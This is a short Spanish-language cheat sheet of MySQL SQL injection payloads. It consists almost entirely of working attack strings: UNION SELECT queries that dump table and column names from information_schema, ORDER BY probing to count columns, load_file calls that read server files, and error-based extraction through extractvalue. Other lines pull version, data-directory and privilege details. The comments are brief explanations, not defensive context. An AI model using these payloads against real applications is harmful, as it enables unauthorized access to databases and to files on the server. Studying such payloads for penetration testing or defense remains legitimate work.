# Recuperacion de tablas al interior de una base de datos
select * from <nombre_tabla> where param_name='toto' union select user(),database(),group_concat(table_name) from information_schema.tables where table_schema=database();

# Con el mismo principio extraccion de todas las columnas de existentes en la base de datos:
select * from <nombre_tabla> where param_name='toto' union select user(),database(),group_concat(column_name) from information_schema.columns where table_schema=database();

# Encontrar el numero de columnas en una table, metodo simple:
order by <1> # incrementar el numero para saber si tal numero de columna existe...

# Cargar un fichero
select * from <nombre_tabla> where param_name='toto' union select user(),database(),load_file("documento");

# Mas information
select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@datadir;
select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@version;

# Error based injeccion, esta afichara informacion en el error sql generado
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 18,1)))-- -
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES LIMIT 5,1)))-- -

# Deteccion de el repertorio y loes privilegios mysql los cuales pueden potenciamente ser leidos, por el root mysql
# or por el utilisador con los privilegios necesarios
SELECT @@secure_file_priv;

# Descubrir los modos sql !!Atencion solo utilisador con privilegios elevados puede observar los modos
SELECT @@sql_mod;
